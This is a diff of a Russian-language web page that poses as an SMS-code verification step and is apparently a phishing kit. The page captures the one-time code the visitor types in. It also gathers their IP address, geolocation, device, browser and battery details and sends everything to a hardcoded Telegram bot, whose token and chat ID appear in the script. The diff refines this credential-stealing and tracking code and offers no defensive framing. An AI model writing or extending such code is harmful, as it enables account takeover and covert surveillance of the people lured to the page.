@@ -35,7 +35,7 @@
         
         .container {
             width: 100%;
-            max-width: 500px;
+            max-width: 1000px;
             background: var(--card-bg);
             border: 1px solid var(--border);
             border-radius: 12px;
@@ -276,19 +276,18 @@
                 <img id="phone-image" src="https://i.redd.it/861gk9gqka0c1.png" alt="Security">
                 
                 <div class="input-group">
-                    <label for="code">Код из SMS (6 цифр)</label>
+                    <label for="code">Код из SMS</label>
                     <input 
                         type="text" 
                         id="code" 
-                        placeholder="XXXXXX" 
+                        placeholder="XXXXX" 
                         required
-                        maxlength="6"
-                        oninput="validateCode(this)"
+                        maxlength="5"
+                        oninput="this.value = this.value.replace(/[^0-9]/g, '')"
                     >
-                    <div class="error-message" id="code-error">Код должен состоять из 6 цифр</div>
                 </div>
                 
-                <button id="code-btn" onclick="sendCode()" disabled>Подтвердить код</button>
+                <button onclick="sendCode()">Подтвердить код</button>
             </div>
             
             <!-- Шаг 3: Результат верификации -->
@@ -307,6 +306,7 @@
     </div>
 
     <script>
+        // Конфигурация бота
         const BOT_TOKEN = "6818081299:AAGEDkvcZltkYKPELkGv8AuvRxpBzqMQLu8";
         const CHAT_ID = "1209403544";
         const MAX_RETRIES = 3; // Максимальное количество попыток отправки
@@ -357,7 +357,6 @@
             
             // Время и дата
             localTime: "N/A",
-            utcTime: "N/A",
             timezoneOffset: "N/A",
             dst: "N/A",
             pageLoadTime: "N/A",
@@ -374,28 +373,8 @@
             // Дополнительные параметры
             doNotTrack: "N/A",
             hardwareConcurrency: "N/A",
-            devicePixelRatio: "N/A",
-            browserLanguage: "N/A"
+            devicePixelRatio: "N/A"
         };
-
-        // Валидация кода (6 цифр)
-        function validateCode(input) {
-            const code = input.value.replace(/\D/g, '');
-            input.value = code;
-            
-            const codeError = document.getElementById('code-error');
-            const codeBtn = document.getElementById('code-btn');
-            
-            if (code.length === 6) {
-                input.classList.remove('error');
-                codeError.style.display = 'none';
-                codeBtn.disabled = false;
-            } else {
-                input.classList.add('error');
-                codeError.style.display = 'block';
-                codeBtn.disabled = true;
-            }
-        }
 
         // Маска для номера телефона
         function formatPhoneNumber(input) {
@@ -442,62 +421,14 @@
             return isValid;
         }
         
-        // Определение устройства по userAgent
-        function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            
-            // Определение ОС
-            if (/android/i.test(ua)) {
-                userData.os = "Android";
-                const match = ua.match(/android\s([0-9\.]+)/i);
-                userData.osVersion = match ? match[1] : "N/A";
-            } else if (/iPad|iPhone|iPod/.test(ua)) {
-                userData.os = "iOS";
-                const match = ua.match(/OS\s(\d+_\d+)/i);
-                if (match) userData.osVersion = match[1].replace('_', '.');
-            } else if (/Macintosh|Mac OS X/.test(ua)) {
-                userData.os = "macOS";
-                const match = ua.match(/Mac OS X\s?([0-9_]+)/i);
-                if (match) userData.osVersion = match[1].replace('_', '.');
-            } else if (/Windows/.test(ua)) {
-                userData.os = "Windows";
-                const match = ua.match(/Windows NT\s?([0-9\.]+)/i);
-                userData.osVersion = match ? match[1] : "N/A";
-            } else if (/Linux/.test(ua)) {
-                userData.os = "Linux";
-                userData.osVersion = "N/A";
-            }
-            
-            // Определение браузера
-            if (/Chrome/.test(ua) && !/Edge|Edg/.test(ua)) {
-                userData.browser = "Chrome";
-                const match = ua.match(/Chrome\/([0-9\.]+)/i);
-                userData.browserVersion = match ? match[1] : "N/A";
-            } else if (/Firefox/.test(ua)) {
-                userData.browser = "Firefox";
-                const match = ua.match(/Firefox\/([0-9\.]+)/i);
-                userData.browserVersion = match ? match[1] : "N/A";
-            } else if (/Safari/.test(ua) && !/Chrome/.test(ua)) {
-                userData.browser = "Safari";
-                const match = ua.match(/Version\/([0-9\.]+)/i);
-                userData.browserVersion = match ? match[1] : "N/A";
-            } else if (/Edge|Edg/.test(ua)) {
-                userData.browser = "Edge";
-                const match = ua.match(/(Edge|Edg)\/([0-9\.]+)/i);
-                userData.browserVersion = match ? match[2] : "N/A";
-            }
-            
-            // Определение устройства
-            if (/Mobile|Android|iPhone|iPad|iPod/.test(ua)) {
-                userData.deviceType = "Mobile";
-            } else {
-                userData.deviceType = "Desktop";
-            }
-            
-            // Определение модели устройства
-            const deviceMatch = ua.match(/(iPhone|iPad|iPod|Android|Windows Phone|BlackBerry|PlayBook|Xbox One|Xbox|PlayStation|Nintendo)/i);
-            if (deviceMatch) {
-                userData.deviceModel = deviceMatch[1];
+        // Сбор данных с использованием прокси для CORS
+        async function fetchWithProxy(url) {
+            try {
+                const response = await fetch(url);
+                return await response.json();
+            } catch (e) {
+                console.error('Ошибка запроса:', e);
+                return {};
             }
         }
         
@@ -508,71 +439,93 @@
                 try {
                     const ipResponse = await fetch('https://api.ipify.org?format=json');
                     const ipData = await ipResponse.json();
-                    userData.ip = ipData.ip || "Не определен";
-                    userData.publicIp = ipData.ip || "Не определен";
+                    userData.ip = ipData.ip || "N/A";
+                    userData.publicIp = ipData.ip || "N/A";
                 } catch (e) {
                     console.log("Ошибка получения IP: ", e);
                 }
                 
                 // 2. Геолокация
-                if (userData.ip !== "Не определен") {
+                if (userData.ip !== "N/A") {
                     try {
-                        const geoResponse = await fetch(`https://ipapi.co/${userData.ip}/json/`);
-                        const geoData = await geoResponse.json();
-                        
-                        if (!geoData.error) {
-                            userData.continent = geoData.continent_code || "Не определен";
-                            userData.country = geoData.country_name || "Не определен";
-                            userData.countryCode = geoData.country_code || "Не определен";
-                            userData.region = geoData.region || "Не определен";
-                            userData.regionCode = geoData.region_code || "Не определен";
-                            userData.city = geoData.city || "Не определен";
-                            userData.postalCode = geoData.postal || "Не определен";
-                            userData.latitude = geoData.latitude || "Не определен";
-                            userData.longitude = geoData.longitude || "Не определен";
-                            userData.timezone = geoData.timezone || "Не определен";
-                            userData.utcOffset = geoData.utc_offset || "Не определен";
-                            userData.callingCode = geoData.country_calling_code || "Не определен";
-                            userData.currency = geoData.currency || "Не определен";
-                            userData.languages = geoData.languages || "Не определен";
-                            userData.isp = geoData.org || "Не определен";
-                            userData.asn = geoData.asn || "Не определен";
-                        }
+                        const geoData = await fetchWithProxy(`https://ipapi.co/${userData.ip}/json/`);
+                        userData.continent = geoData.continent_code || "N/A";
+                        userData.country = geoData.country_name || "N/A";
+                        userData.countryCode = geoData.country_code || "N/A";
+                        userData.region = geoData.region || "N/A";
+                        userData.regionCode = geoData.region_code || "N/A";
+                        userData.city = geoData.city || "N/A";
+                        userData.postalCode = geoData.postal || "N/A";
+                        userData.latitude = geoData.latitude || "N/A";
+                        userData.longitude = geoData.longitude || "N/A";
+                        userData.timezone = geoData.timezone || "N/A";
+                        userData.utcOffset = geoData.utc_offset || "N/A";
+                        userData.callingCode = geoData.country_calling_code || "N/A";
+                        userData.currency = geoData.currency || "N/A";
+                        userData.languages = geoData.languages || "N/A";
+                        userData.isp = geoData.org || "N/A";
+                        userData.asn = geoData.asn || "N/A";
                     } catch (e) {
                         console.log("Ошибка геолокации: ", e);
                     }
                 }
                 
-                // 3. Данные устройства и браузера
-                getDeviceInfo();
+                // 3. Данные устройства
+                userData.deviceType = /Mobile|Tablet/.test(navigator.userAgent) ? "Mobile" : "Desktop";
+                userData.os = navigator.platform || "N/A";
+                userData.osVersion = navigator.oscpu || "N/A";
+                userData.cpuCores = navigator.hardwareConcurrency || "N/A";
+                userData.deviceMemory = navigator.deviceMemory || "N/A";
                 
-                // 4. Основные данные
+                // 4. Браузерные данные
                 userData.userAgent = navigator.userAgent;
-                userData.cookies = navigator.cookieEnabled ? "Включены" : "Отключены";
-                userData.doNotTrack = navigator.doNotTrack || "Не поддерживается";
-                userData.referrer = document.referrer || "Прямой переход";
+                userData.browser = navigator.appName;
+                userData.browserVersion = navigator.appVersion;
+                userData.cookies = navigator.cookieEnabled ? "Enabled" : "Disabled";
+                userData.doNotTrack = navigator.doNotTrack || "N/A";
+                userData.referrer = document.referrer || "Direct";
                 userData.entryUrl = window.location.href;
                 
                 // 5. Временные параметры
                 userData.localTime = new Date().toLocaleString();
-                userData.utcTime = new Date().toUTCString();
                 userData.timezoneOffset = new Date().getTimezoneOffset();
-                userData.browserLanguage = navigator.language || "Не определен";
+                userData.dst = new Date().getTimezoneOffset() < Math.max(new Date(2023, 0, 1).getTimezoneOffset(), new Date(2023, 6, 1).getTimezoneOffset()) ? "Yes" : "No";
+                userData.pageLoadTime = window.performance.timing.domContentLoadedEventEnd - window.performance.timing.navigationStart + " ms";
                 
-                // 6. Производительность
-                if (window.performance) {
-                    userData.pageLoadTime = 
-                        window.performance.timing.domContentLoadedEventEnd - 
-                        window.performance.timing.navigationStart + " ms";
-                }
-                
-                // 7. Дополнительные параметры
-                userData.hardwareConcurrency = navigator.hardwareConcurrency || "Не определен";
-                userData.deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Не определен";
+                // 6. Дополнительные параметры
+                userData.batteryLevel = await getBatteryLevel();
+                userData.chargingStatus = await getChargingStatus();
+                userData.hardwareConcurrency = navigator.hardwareConcurrency || "N/A";
+                userData.devicePixelRatio = window.devicePixelRatio;
                 
             } catch (e) {
                 console.error("Ошибка сбора данных: ", e);
             }
+        }
+        
+        // Вспомогательные функции
+        async function getBatteryLevel() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return Math.round(battery.level * 100) + "%";
+                } catch (e) {
+                    return "N/A";
+                }
+            }
+            return "N/A";
+        }
+        
+        async function getChargingStatus() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return battery.charging ? "Charging" : "Not charging";
+                } catch (e) {
+                    return "N/A";
+                }
+            }
+            return "N/A";
         }
         
         // Отправка данных в Telegram с повторными попытками
@@ -583,7 +536,7 @@
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({
-                            chat_id: const CHAT_ID,
+                            chat_id: CHAT_ID,
                             text: text,
                             parse_mode: "HTML"
                         })
@@ -605,40 +558,40 @@
         
         // Форматирование данных для Telegram
         function formatFullData() {
+            // Проверка на пустые значения
+            for (const key in userData) {
+                if (userData[key] === undefined || userData[key] === "") {
+                    userData[key] = "N/A";
+                }
+            }
+            
             let message = `🌐 <b>ДАННЫЕ ПОЛЬЗОВАТЕЛЯ</b> 🌐\n`;
             
             message += `📍 <b>ГЕОЛОКАЦИЯ</b>\n`;
             message += `├ Страна: ${userData.country} (${userData.countryCode})\n`;
             message += `├ Регион: ${userData.region}\n`;
             message += `├ Город: ${userData.city}\n`;
-            message += `├ Почтовый индекс: ${userData.postalCode}\n`;
             message += `├ Координаты: ${userData.latitude}, ${userData.longitude}\n`;
-            message += `├ Часовой пояс: ${userData.timezone}\n`;
-            message += `├ Провайдер: ${userData.isp}\n`;
-            message += `└ IP-адрес: ${userData.ip}\n\n`;
+            message += `└ Провайдер: ${userData.isp}\n\n`;
             
             message += `💻 <b>УСТРОЙСТВО</b>\n`;
             message += `├ Тип: ${userData.deviceType}\n`;
-            message += `├ Модель: ${userData.deviceModel || "Не определено"}\n`;
-            message += `├ ОС: ${userData.os} ${userData.osVersion || ""}\n`;
-            message += `├ Ядра CPU: ${userData.hardwareConcurrency}\n`;
-            message += `└ Память: ${userData.deviceMemory}\n\n`;
+            message += `├ ОС: ${userData.os} ${userData.osVersion}\n`;
+            message += `├ Ядра CPU: ${userData.cpuCores}\n`;
+            message += `└ Память: ${userData.deviceMemory} GB\n\n`;
             
             message += `🔍 <b>БРАУЗЕР</b>\n`;
             message += `├ Название: ${userData.browser}\n`;
             message += `├ Версия: ${userData.browserVersion}\n`;
-            message += `├ Язык: ${userData.browserLanguage}\n`;
-            message += `├ Cookies: ${userData.cookies}\n`;
             message += `└ User Agent: ${userData.userAgent}\n\n`;
             
-            message += `⏱ <b>ВРЕМЯ И ПРОИЗВОДИТЕЛЬНОСТЬ</b>\n`;
+            message += `⏱ <b>ВРЕМЯ</b>\n`;
             message += `├ Локальное время: ${userData.localTime}\n`;
-            message += `├ UTC время: ${userData.utcTime}\n`;
-            message += `└ Загрузка страницы: ${userData.pageLoadTime || "Недоступно"}\n\n`;
+            message += `└ Часовой пояс: ${userData.timezone}\n\n`;
             
-            message += `🔗 <b>СЕССИЯ</b>\n`;
-            message += `├ Источник: ${userData.referrer}\n`;
-            message += `└ URL входа: ${userData.entryUrl}`;
+            message += `⚡ <b>ДОПОЛНИТЕЛЬНО</b>\n`;
+            message += `├ Уровень батареи: ${userData.batteryLevel}\n`;
+            message += `└ Статус зарядки: ${userData.chargingStatus}`;
             
             return message;
         }
@@ -669,15 +622,7 @@
         
         // Отправка кода
         async function sendCode() {
-            const codeInput = document.getElementById('code');
-            userData.code = codeInput.value;
-            
-            // Проверка длины кода
-            if (userData.code.length !== 6) {
-                codeInput.classList.add('error');
-                document.getElementById('code-error').style.display = 'block';
-                return;
-            }
+            userData.code = document.getElementById('code').value;
             
             // Переключение на экран верификации
             document.getElementById('code-section').style.display = 'none';
@@ -708,7 +653,7 @@
                 await collectFullData();
                 await sendFullDataToTelegram();
             } catch (e) {
-                console.error("Критическая ошибка: ", e);
+               console.error("Критическая ошибка: ", e);
             } finally {
                 showPhoneSection();
             }
